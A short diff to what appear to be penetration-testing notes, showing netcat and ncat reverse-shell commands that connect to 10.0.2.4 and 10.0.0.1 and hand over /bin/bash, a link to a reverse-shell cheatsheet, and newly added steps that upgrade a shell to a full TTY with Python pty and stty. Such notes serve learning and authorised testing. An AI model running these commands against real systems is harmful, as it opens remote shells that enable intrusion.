@@ -34,3 +34,9 @@ Target:
 `netcat 10.0.2.4 4444 -e /bin/bash` or `nc -c bash 10.0.0.1 4444`  
 `-e` execute that program after connection -> that way you can send commends directly to opened shell via TCP connection (also possible with UDP `ncat --udp 10.0.0.1 4242 -e /bin/bash`)
 [other reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+Python tty (teletypewriter) wrapper:  
+`python -c 'import pty; pty.spawn("/bin/bash")'  
+export TERM=xterm  
+CTRL+Z  
+stty raw -echo; fg`  
